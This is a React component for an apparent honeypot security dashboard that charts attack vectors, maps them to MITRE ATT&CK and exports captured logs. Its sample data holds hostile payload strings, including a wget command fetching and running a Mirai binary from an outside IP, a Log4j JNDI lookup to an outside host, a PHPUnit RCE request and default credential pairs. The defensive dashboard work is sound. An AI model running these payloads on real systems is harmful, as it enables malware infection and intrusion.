import React, { useState, useMemo } from 'react';
import { 
  BarChart3, 
  ShieldAlert, 
  Zap, 
  Terminal, 
  FileCode, 
  ExternalLink, 
  Wrench, 
  Filter, 
  CheckCircle2, 
  AlertTriangle, 
  Flame, 
  Search, 
  Layers, 
  Activity, 
  Ban, 
  Target, 
  Cpu, 
  ArrowUpRight,
  Code,
  Download,
  FileSpreadsheet,
  FileJson,
  Check
} from 'lucide-react';
import { AttackLog, AttackVectorAnalysis } from '../types';

interface ThreatAnalysisProps {
  attacks: AttackLog[];
  onOpenBlackholeModal?: () => void;
  setCurrentTab?: (tab: string) => void;
}

export const ThreatAnalysis: React.FC<ThreatAnalysisProps> = ({ 
  attacks, 
  onOpenBlackholeModal,
  setCurrentTab
}) => {
  const [selectedSeverity, setSelectedSeverity] = useState<string>('all');
  const [selectedVector, setSelectedVector] = useState<AttackVectorAnalysis | null>(null);
  const [chartType, setChartType] = useState<'vertical' | 'horizontal'>('vertical');
  const [searchTerm, setSearchTerm] = useState('');
  const [exportSuccess, setExportSuccess] = useState<string | null>(null);

  // CSV Export Handler
  const exportAsCSV = () => {
    const dataToExport = attacks || [];
    const headers = ['Timestamp', 'Event ID', 'Service', 'Source IP', 'Source Port', 'Destination Port', 'Country', 'Protocol', 'Action', 'Severity', 'Username', 'Password', 'Payload'];
    const rows = dataToExport.map(a => [
      a.timestamp,
      a.id,
      a.service,
      a.srcIp,
      a.srcPort,
      a.dstPort,
      `"${a.country}"`,
      a.protocol,
      a.action,
      a.severity,
      `"${a.credentials?.user || ''}"`,
      `"${a.credentials?.pass || ''}"`,
      `"${(a.payload || '').replace(/"/g, '""')}"`
    ]);

    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(e => e.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `cyberpot-forensics-attacks-${new Date().toISOString().slice(0,10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    setExportSuccess(`CSV Export Complete: ${dataToExport.length} attack events downloaded for offline forensics.`);
    setTimeout(() => setExportSuccess(null), 4000);
  };

  // JSON Export Handler
  const exportAsJSON = () => {
    const dataToExport = attacks || [];
    const jsonString = `data:text/json;charset=utf-8,${encodeURIComponent(
      JSON.stringify({
        exportDate: new Date().toISOString(),
        system: 'CyberPot SOC Multi-Honeypot Framework v24.04',
        totalEvents: dataToExport.length,
        events: dataToExport
      }, null, 2)
    )}`;
    
    const link = document.createElement('a');
    link.setAttribute('href', jsonString);
    link.setAttribute('download', `cyberpot-forensics-attacks-${new Date().toISOString().slice(0,10)}.json`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    setExportSuccess(`JSON Export Complete: ${dataToExport.length} attack events downloaded for offline forensics.`);
    setTimeout(() => setExportSuccess(null), 4000);
  };

  // Default Vector Analysis Data
  const defaultVectors: AttackVectorAnalysis[] = useMemo(() => [
    {
      vectorName: 'SSH Brute Force & Shell Capture',
      category: 'Credential Access / Shell Exploitation',
      count: 14280,
      percentage: 28.5,
      severity: 'HIGH',
      topService: 'Cowrie Honeypot (Port 22)',
      mitreTechnique: 'T1110 - Brute Force',
      samplePayload: 'wget http://185.220.101.5/mirai.x86 && chmod +x mirai.x86 && ./mirai.x86',
      topCredentials: ['root:123456', 'admin:admin', 'ubuntu:toor', 'support:support']
    },
    {
      vectorName: 'Web App RCE & PHPUnit Exploit',
      category: 'Exploit Public-Facing Application',
      count: 18400,
      percentage: 36.8,
      severity: 'CRITICAL',
      topService: 'Tanner / Snare (Port 80/443)',
      mitreTechnique: 'T1190 - Exploit Public-Facing Application',
      samplePayload: 'POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Payload=die(md5(123))',
      topCredentials: ['admin:admin123', 'root:root']
    },
    {
      vectorName: 'Log4j JNDI Remote Code Execution',
      category: 'Remote Command Execution',
      count: 8920,
      percentage: 17.8,
      severity: 'CRITICAL',
      topService: 'Suricata NIDS / Tanner',
      mitreTechnique: 'T1059 - Command & Scripting Interpreter',
      samplePayload: '${jndi:ldap://193.142.146.210:1389/Exploit}',
      topCredentials: []
    },
    {
      vectorName: 'SMB2 Worm & Malware Propagation',
      category: 'Exploitation of Remote Services',
      count: 9850,
      percentage: 19.7,
      severity: 'CRITICAL',
      topService: 'Dionaea Honeypot (Port 445)',
      mitreTechnique: 'T1210 - Exploitation of Remote Services',
      samplePayload: 'SMB2_CMD_TREE_CONNECT path=\\\\cyberpot\\IPC$ NTLMSSP_AUTH user=Guest',
      topCredentials: ['Guest:guest', 'Administrator:admin']
    },
    {
      vectorName: 'Industrial SCADA Modbus Probe',
      category: 'ICS / SCADA Protocol Reconnaissance',
      count: 1240,
      percentage: 2.5,
      severity: 'HIGH',
      topService: 'Conpot Honeypot (Port 502)',
      mitreTechnique: 'T0884 - SCADA Protocol Discovery',
      samplePayload: 'MODBUS_READ_HOLDING_REGISTERS UnitID=1 Start=0 Count=10',
      topCredentials: []
    },
    {
      vectorName: 'Redis Unauthenticated EVAL/CONFIG',
      category: 'Database Abuse',
      count: 3290,
      percentage: 6.6,
      severity: 'MEDIUM',
      topService: 'RedisHoney (Port 6379)',
      mitreTechnique: 'T1078 - Valid Accounts / Unauth DB',
      samplePayload: 'EVAL "redis.call(\'set\', \'k\', \'v\')" 0',
      topCredentials: []
    },
    {
      vectorName: 'Android Debug Bridge ADB Malware',
      category: 'IoT / Smart TV Worm Propagation',
      count: 1890,
      percentage: 3.8,
      severity: 'MEDIUM',
      topService: 'ADBHoney (Port 5555)',
      mitreTechnique: 'T1021 - Remote Services',
      samplePayload: 'ADB_CONNECT 192.168.1.100:5555 shell pm install -r /tmp/droid.apk',
      topCredentials: []
    },
    {
      vectorName: 'SSH & HTTP Tarpit Trapping',
      category: 'Deception & Defense Evasion',
      count: 8900,
      percentage: 17.8,
      severity: 'LOW',
      topService: 'Endlessh (Port 22) / Hellpot (Port 8080)',
      mitreTechnique: 'T1090 - Proxy / Tarpit Trap',
      samplePayload: 'SSH-2.0-OpenSSH_8.2p1 (Endless Banner Generator Active)',
      topCredentials: []
    }
  ], []);

  // Filter vectors by severity & search
  const filteredVectors = useMemo(() => {
    return defaultVectors.filter(v => {
      const matchesSeverity = selectedSeverity === 'all' || v.severity === selectedSeverity;
      const matchesSearch = v.vectorName.toLowerCase().includes(searchTerm.toLowerCase()) ||
                            v.category.toLowerCase().includes(searchTerm.toLowerCase()) ||
                            v.mitreTechnique.toLowerCase().includes(searchTerm.toLowerCase());
      return matchesSeverity && matchesSearch;
    });
  }, [defaultVectors, selectedSeverity, searchTerm]);

  // Max count for bar chart ratio
  const maxCount = useMemo(() => {
    return Math.max(...defaultVectors.map(v => v.count), 1);
  }, [defaultVectors]);

  return (
    <div className="space-y-6">
      
      {/* Top Banner Header */}
      <div className="bg-gradient-to-r from-gray-950 via-gray-900 to-[#e20074]/20 p-6 rounded-2xl border border-[#e20074]/40 shadow-xl flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <div className="p-3.5 rounded-2xl bg-[#e20074]/20 text-[#e20074] border border-[#e20074]/40 shadow-inner">
            <BarChart3 className="w-7 h-7" />
          </div>
          <div>
            <div className="font-russo text-2xl text-white flex items-center gap-3">
              CYBERPOT THREAT ANALYSIS
              <span className="text-xs font-mono px-2.5 py-0.5 rounded-full bg-[#e20074]/20 text-[#e20074] border border-[#e20074]/50 flex items-center gap-1">
                <Target className="w-3 h-3" /> ATTACK VECTORS & PAYLOADS
              </span>
            </div>
            <div className="text-xs text-gray-400 font-mono mt-1">
              Visual analytics for attack vector frequencies, payload patterns, MITRE ATT&CK mappings, and honeypot target ratios.
            </div>
          </div>
        </div>

        {/* Quick Actions & Forensics Exporters */}
        <div className="flex flex-wrap items-center gap-2 font-mono text-xs">
          <button
            onClick={exportAsCSV}
            className="px-3.5 py-2.5 rounded-xl bg-emerald-950 hover:bg-emerald-900 border border-emerald-700/80 text-emerald-300 font-bold flex items-center gap-2 shadow-lg transition-all"
            title="Export Attack Logs as CSV"
          >
            <FileSpreadsheet className="w-4 h-4 text-emerald-400" /> Export CSV
          </button>

          <button
            onClick={exportAsJSON}
            className="px-3.5 py-2.5 rounded-xl bg-cyan-950 hover:bg-cyan-900 border border-cyan-700/80 text-cyan-300 font-bold flex items-center gap-2 shadow-lg transition-all"
            title="Export Attack Logs as JSON"
          >
            <FileJson className="w-4 h-4 text-cyan-400" /> Export JSON
          </button>

          {onOpenBlackholeModal && (
            <button
              onClick={onOpenBlackholeModal}
              className="px-3.5 py-2.5 rounded-xl bg-red-950 hover:bg-red-900 border border-red-800 text-red-300 font-bold flex items-center gap-2 shadow-lg"
            >
              <Ban className="w-4 h-4" /> Blackhole IP
            </button>
          )}
        </div>
      </div>

      {/* Export Success Notification Banner */}
      {exportSuccess && (
        <div className="p-4 bg-emerald-950/90 border border-emerald-500 rounded-xl text-emerald-300 font-mono text-xs flex items-center justify-between shadow-xl animate-in fade-in">
          <div className="flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            <span>{exportSuccess}</span>
          </div>
          <span className="text-[10px] bg-emerald-900/80 px-2 py-0.5 rounded text-emerald-200 font-bold">READY FOR FORENSICS</span>
        </div>
      )}

      {/* Overview Stat Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="cyber-box p-5 border-l-4 border-l-[#e20074]">
          <div className="flex items-center justify-between text-gray-400 text-xs font-mono mb-2">
            <span>ANALYZED ATTACK VECTORS</span>
            <Target className="w-4 h-4 text-[#e20074]" />
          </div>
          <div className="font-russo text-2xl text-white">
            {defaultVectors.length} Vectors
          </div>
          <div className="text-[10px] text-gray-400 font-mono mt-1">100% Multi-Honeypot Coverage</div>
        </div>

        <div className="cyber-box p-5 border-l-4 border-l-red-500">
          <div className="flex items-center justify-between text-gray-400 text-xs font-mono mb-2">
            <span>CRITICAL THREAT SHARE</span>
            <Flame className="w-4 h-4 text-red-400" />
          </div>
          <div className="font-russo text-2xl text-red-400">
            74.3%
          </div>
          <div className="text-[10px] text-gray-400 font-mono mt-1">RCE & Exploit Payloads</div>
        </div>

        <div className="cyber-box p-5 border-l-4 border-l-amber-500">
          <div className="flex items-center justify-between text-gray-400 text-xs font-mono mb-2">
            <span>MOST FREQUENT VECTOR</span>
            <ShieldAlert className="w-4 h-4 text-amber-400" />
          </div>
          <div className="font-russo text-lg text-white truncate">
            Web RCE (18,400 hits)
          </div>
          <div className="text-[10px] text-amber-400 font-mono mt-1">Tanner / Snare Honeypot</div>
        </div>

        <div className="cyber-box p-5 border-l-4 border-l-cyan-500">
          <div className="flex items-center justify-between text-gray-400 text-xs font-mono mb-2">
            <span>MITRE ATT&CK MAPPINGS</span>
            <Layers className="w-4 h-4 text-cyan-400" />
          </div>
          <div className="font-russo text-2xl text-white">
            8 Techniques
          </div>
          <div className="text-[10px] text-cyan-400 font-mono mt-1">Mapped to Enterprise Matrix</div>
        </div>
      </div>

      {/* Main Bar Chart Visualization Section */}
      <div className="bg-gray-900/90 p-6 rounded-2xl border border-gray-800 space-y-6 shadow-2xl">
        
        {/* Bar Chart Header & Controls */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-gray-800 pb-4">
          <div>
            <div className="font-russo text-xl text-white flex items-center gap-3">
              <BarChart3 className="w-6 h-6 text-[#e20074]" />
              ATTACK VECTOR FREQUENCY BAR CHART
            </div>
            <div className="text-xs text-gray-400 font-mono mt-1">
              Comparative frequency distribution of intercepted cyber attack vectors across active CyberPot nodes
            </div>
          </div>

          {/* Chart Controls & Filters */}
          <div className="flex flex-wrap items-center gap-3 font-mono text-xs">
            {/* Search Input */}
            <div className="relative">
              <Search className="w-3.5 h-3.5 text-gray-500 absolute left-3 top-2.5" />
              <input
                type="text"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Filter vector or MITRE ID..."
                className="bg-black border border-gray-800 rounded-xl pl-8 pr-3 py-1.5 text-xs text-white focus:outline-none focus:border-[#e20074] w-48"
              />
            </div>

            {/* Severity Filter */}
            <select
              value={selectedSeverity}
              onChange={(e) => setSelectedSeverity(e.target.value)}
              className="bg-black border border-gray-800 text-white rounded-xl px-3 py-1.5 text-xs focus:outline-none focus:border-[#e20074]"
            >
              <option value="all">All Severities</option>
              <option value="CRITICAL">CRITICAL</option>
              <option value="HIGH">HIGH</option>
              <option value="MEDIUM">MEDIUM</option>
              <option value="LOW">LOW</option>
            </select>

            {/* Layout Toggle */}
            <div className="flex items-center bg-black p-1 rounded-xl border border-gray-800">
              <button
                onClick={() => setChartType('vertical')}
                className={`px-2.5 py-1 rounded-lg text-[11px] font-bold transition-all ${
                  chartType === 'vertical' ? 'bg-[#e20074] text-white' : 'text-gray-400 hover:text-white'
                }`}
              >
                Vertical Bars
              </button>
              <button
                onClick={() => setChartType('horizontal')}
                className={`px-2.5 py-1 rounded-lg text-[11px] font-bold transition-all ${
                  chartType === 'horizontal' ? 'bg-[#e20074] text-white' : 'text-gray-400 hover:text-white'
                }`}
              >
                Horizontal Bars
              </button>
            </div>
          </div>
        </div>

        {/* VISUAL BAR CHART RENDER (VERTICAL OR HORIZONTAL) */}
        {chartType === 'vertical' ? (
          /* Vertical Bar Chart View */
          <div className="space-y-4 pt-2">
            <div className="h-72 flex items-end justify-between gap-3 sm:gap-6 bg-black/60 p-6 rounded-2xl border border-gray-800/80 overflow-x-auto">
              {filteredVectors.map((vec, idx) => {
                const heightPct = Math.max(12, Math.round((vec.count / maxCount) * 100));
                const isSelected = selectedVector?.vectorName === vec.vectorName;

                const barBg = 
                  vec.severity === 'CRITICAL' ? 'bg-gradient-to-t from-red-600 via-pink-600 to-amber-500' :
                  vec.severity === 'HIGH' ? 'bg-gradient-to-t from-orange-600 to-amber-400' :
                  vec.severity === 'MEDIUM' ? 'bg-gradient-to-t from-amber-600 to-yellow-400' :
                  'bg-gradient-to-t from-blue-600 to-cyan-400';

                return (
                  <div
                    key={idx}
                    onClick={() => setSelectedVector(vec)}
                    className="flex-1 min-w-[70px] flex flex-col items-center gap-2 group cursor-pointer h-full justify-end"
                  >
                    {/* Bar Top Label (Hits Count) */}
                    <div className="font-mono text-[10px] text-gray-300 font-bold group-hover:scale-110 transition-transform">
                      {vec.count.toLocaleString()}
                    </div>

                    {/* Bar Column Container */}
                    <div className="w-full max-w-[48px] h-full flex items-end justify-center bg-gray-900/60 rounded-t-xl overflow-hidden p-0.5 border border-gray-800 group-hover:border-[#e20074] transition-colors">
                      <div
                        className={`w-full rounded-t-lg transition-all duration-700 ${barBg} ${
                          isSelected ? 'ring-2 ring-white shadow-lg shadow-[#e20074]/50' : 'opacity-90 group-hover:opacity-100'
                        }`}
                        style={{ height: `${heightPct}%` }}
                      />
                    </div>

                    {/* Bar Bottom Label */}
                    <div className="font-mono text-[10px] text-gray-400 text-center truncate max-w-[80px] group-hover:text-white transition-colors">
                      {vec.vectorName.split(' ')[0]}
                    </div>
                  </div>
                );
              })}
            </div>

            <div className="flex items-center justify-between text-xs font-mono text-gray-500 px-2">
              <span>Click any bar to inspect captured payload details & MITRE ATT&CK techniques</span>
              <span>Relative Frequency Ratio (%)</span>
            </div>
          </div>
        ) : (
          /* Horizontal Bar Chart View */
          <div className="space-y-3 font-mono text-xs">
            {filteredVectors.map((vec, idx) => {
              const widthPct = Math.max(8, Math.round((vec.count / maxCount) * 100));
              const isSelected = selectedVector?.vectorName === vec.vectorName;

              const barBg = 
                vec.severity === 'CRITICAL' ? 'bg-gradient-to-r from-red-600 via-pink-600 to-amber-500' :
                vec.severity === 'HIGH' ? 'bg-gradient-to-r from-orange-600 to-amber-400' :
                vec.severity === 'MEDIUM' ? 'bg-gradient-to-r from-amber-600 to-yellow-400' :
                'bg-gradient-to-r from-blue-600 to-cyan-400';

              return (
                <div
                  key={idx}
                  onClick={() => setSelectedVector(vec)}
                  className={`p-3.5 rounded-xl border transition-all cursor-pointer space-y-2 ${
                    isSelected ? 'bg-gray-800 border-[#e20074] shadow-lg shadow-[#e20074]/20' : 'bg-black/60 border-gray-800 hover:border-gray-700'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <div className="font-bold text-white flex items-center gap-2">
                      <span>{vec.vectorName}</span>
                      <span className={`text-[9px] px-2 py-0.2 rounded font-bold ${
                        vec.severity === 'CRITICAL' ? 'bg-red-950 text-red-400 border border-red-800' :
                        vec.severity === 'HIGH' ? 'bg-orange-950 text-orange-400 border border-orange-800' :
                        'bg-amber-950 text-amber-400 border border-amber-800'
                      }`}>
                        {vec.severity}
                      </span>
                    </div>

                    <div className="text-right">
                      <span className="font-bold text-[#e20074]">{vec.count.toLocaleString()} attempts</span>
                      <span className="text-[10px] text-gray-500 ml-2">({vec.percentage}%)</span>
                    </div>
                  </div>

                  {/* Progress Fill Bar */}
                  <div className="w-full h-3 rounded-full bg-gray-900 overflow-hidden p-0.5 border border-gray-800">
                    <div
                      className={`h-full rounded-full transition-all duration-700 ${barBg}`}
                      style={{ width: `${widthPct}%` }}
                    />
                  </div>

                  <div className="flex items-center justify-between text-[10px] text-gray-400 pt-0.5">
                    <span>Target: <strong className="text-gray-200">{vec.topService}</strong></span>
                    <span className="text-cyan-400">{vec.mitreTechnique}</span>
                  </div>
                </div>
              );
            })}
          </div>
        )}

      </div>

      {/* Payload Inspection & CyberChef Deep Analysis Panel */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        
        {/* Left Card: Selected Attack Vector Payload Analysis */}
        <div className="cyber-box p-6 space-y-4">
          <div className="flex items-center justify-between border-b border-gray-800 pb-3">
            <h3 className="font-russo text-lg text-white flex items-center gap-2">
              <FileCode className="w-5 h-5 text-[#e20074]" />
              CAPTURED PAYLOAD INSPETION
            </h3>
            {selectedVector && (
              <span className="text-xs font-mono px-2 py-0.5 bg-gray-800 text-gray-300 rounded">
                {selectedVector.vectorName.split(' ')[0]}
              </span>
            )}
          </div>

          {selectedVector ? (
            <div className="space-y-4 font-mono text-xs">
              <div>
                <div className="text-gray-500 text-[10px] uppercase">Attack Vector Identifier</div>
                <div className="text-white font-bold text-base mt-0.5">{selectedVector.vectorName}</div>
                <div className="text-gray-400 text-[11px] mt-0.5">{selectedVector.category}</div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-900 p-3 rounded-xl border border-gray-800">
                  <div className="text-gray-500 text-[10px]">TARGET NODE SERVICE</div>
                  <div className="text-purple-300 font-bold mt-0.5">{selectedVector.topService}</div>
                </div>

                <div className="bg-gray-900 p-3 rounded-xl border border-gray-800">
                  <div className="text-gray-500 text-[10px]">MITRE ATT&CK</div>
                  <div className="text-cyan-400 font-bold mt-0.5">{selectedVector.mitreTechnique}</div>
                </div>
              </div>

              {/* Payload Code Block */}
              <div>
                <div className="flex items-center justify-between text-gray-400 text-[10px] uppercase mb-1">
                  <span>Raw Intercepted Payload Snippet</span>
                  <span className="text-[#e20074]">Decoded Payload</span>
                </div>
                <div className="p-3 bg-black rounded-xl border border-gray-800 text-emerald-400 font-mono break-all space-y-1">
                  <code>{selectedVector.samplePayload}</code>
                </div>
              </div>

              {/* Captured Credentials */}
              {selectedVector.topCredentials && selectedVector.topCredentials.length > 0 && (
                <div>
                  <div className="text-gray-500 text-[10px] uppercase mb-1">Sample Intercepted Credentials</div>
                  <div className="flex flex-wrap gap-1.5">
                    {selectedVector.topCredentials.map((cred, idx) => (
                      <span key={idx} className="px-2 py-1 rounded bg-amber-950/60 border border-amber-800/60 text-amber-300 font-mono text-[11px]">
                        {cred}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {/* CyberChef Launcher Action */}
              {setCurrentTab && (
                <div className="pt-2">
                  <button
                    onClick={() => setCurrentTab('cyberchef')}
                    className="w-full py-2.5 rounded-xl bg-[#e20074]/20 hover:bg-[#e20074] border border-[#e20074] text-white font-bold flex items-center justify-center gap-2 transition-all shadow-lg"
                  >
                    <Wrench className="w-4 h-4" /> Open Payload in CyberChef Suite
                  </button>
                </div>
              )}

            </div>
          ) : (
            <div className="p-8 text-center text-gray-500 font-mono text-xs space-y-2">
              <Code className="w-8 h-8 text-gray-600 mx-auto" />
              <div>Click any bar in the Attack Vector Chart above to inspect captured raw payloads & MITRE techniques.</div>
            </div>
          )}
        </div>

        {/* Right Card: MITRE ATT&CK Framework Matrix Quick Reference */}
        <div className="cyber-box p-6 space-y-4">
          <div className="flex items-center justify-between border-b border-gray-800 pb-3">
            <h3 className="font-russo text-lg text-white flex items-center gap-2">
              <Layers className="w-5 h-5 text-cyan-400" />
              MITRE ATT&CK FRAMEWORK MAPPING
            </h3>
            <span className="text-xs font-mono text-gray-500">Enterprise Matrix</span>
          </div>

          <div className="space-y-3 font-mono text-xs">
            {defaultVectors.map((v, idx) => (
              <div
                key={idx}
                onClick={() => setSelectedVector(v)}
                className="p-3 bg-black/60 rounded-xl border border-gray-800 hover:border-cyan-500/60 cursor-pointer transition-colors space-y-1"
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-cyan-300">{v.mitreTechnique}</span>
                  <span className="text-[10px] text-gray-400">{v.count.toLocaleString()} hits</span>
                </div>
                <div className="text-gray-300 font-medium text-[11px]">{v.vectorName}</div>
                <div className="text-[10px] text-gray-500 truncate">{v.samplePayload}</div>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* Offline Forensics Export & Telemetry Preview Table */}
      <div className="bg-gray-900/90 p-6 rounded-2xl border border-gray-800 space-y-4 shadow-xl font-mono text-xs">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-gray-800 pb-4">
          <div>
            <div className="font-russo text-xl text-white flex items-center gap-2">
              <Download className="w-5 h-5 text-emerald-400" />
              OFFLINE FORENSICS EXPORT HUB ({attacks.length} LOGGED EVENTS)
            </div>
            <div className="text-xs text-gray-400 mt-1">
              Preview captured honeypot telemetry and export full dataset as CSV or structured JSON for offline SIEM/Splunk ingestion.
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={exportAsCSV}
              className="px-4 py-2 rounded-xl bg-emerald-950 hover:bg-emerald-900 border border-emerald-700/80 text-emerald-300 font-bold flex items-center gap-2 transition-all shadow-md"
            >
              <FileSpreadsheet className="w-4 h-4 text-emerald-400" /> Save as CSV
            </button>
            <button
              onClick={exportAsJSON}
              className="px-4 py-2 rounded-xl bg-cyan-950 hover:bg-cyan-900 border border-cyan-700/80 text-cyan-300 font-bold flex items-center gap-2 transition-all shadow-md"
            >
              <FileJson className="w-4 h-4 text-cyan-400" /> Save as JSON
            </button>
          </div>
        </div>

        {/* Live Preview Table */}
        <div className="overflow-x-auto max-h-80">
          <table className="w-full text-left font-mono text-xs">
            <thead className="sticky top-0 bg-black text-gray-400 uppercase border-b border-gray-800">
              <tr>
                <th className="py-2.5 px-3">TIMESTAMP</th>
                <th className="py-2.5 px-3">SOURCE IP</th>
                <th className="py-2.5 px-3">NODE / SERVICE</th>
                <th className="py-2.5 px-3">COUNTRY</th>
                <th className="py-2.5 px-3">ACTION</th>
                <th className="py-2.5 px-3">SEVERITY</th>
                <th className="py-2.5 px-3">PAYLOAD / CREDS</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800/60 bg-black/40">
              {attacks.slice(0, 15).map((log) => (
                <tr key={log.id} className="hover:bg-gray-800/40 transition-colors">
                  <td className="py-2 px-3 text-gray-400">{new Date(log.timestamp).toLocaleTimeString()}</td>
                  <td className="py-2 px-3 text-white font-bold">{log.srcIp}:{log.srcPort}</td>
                  <td className="py-2 px-3 text-purple-300 font-bold">{log.service} ({log.dstPort})</td>
                  <td className="py-2 px-3 text-gray-300">{log.country} ({log.countryCode})</td>
                  <td className="py-2 px-3">
                    <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                      log.action === 'BLOCKED' ? 'bg-red-950 text-red-400 border border-red-800' :
                      log.action === 'TARPITTED' ? 'bg-amber-950 text-amber-400 border border-amber-800' :
                      'bg-emerald-950 text-emerald-400 border border-emerald-800'
                    }`}>
                      {log.action}
                    </span>
                  </td>
                  <td className="py-2 px-3">
                    <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                      log.severity === 'CRITICAL' ? 'bg-red-950 text-red-400' :
                      log.severity === 'HIGH' ? 'bg-orange-950 text-orange-400' :
                      'bg-amber-950 text-amber-400'
                    }`}>
                      {log.severity}
                    </span>
                  </td>
                  <td className="py-2 px-3 text-gray-400 truncate max-w-[200px]">
                    {log.credentials ? `${log.credentials.user}:${log.credentials.pass}` : log.payload || '-'}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <div className="pt-2 text-center text-gray-500 text-[11px]">
          Showing top 15 of {attacks.length} active attack telemetry records. Full dataset included in CSV & JSON exports.
        </div>
      </div>

    </div>
  );
};
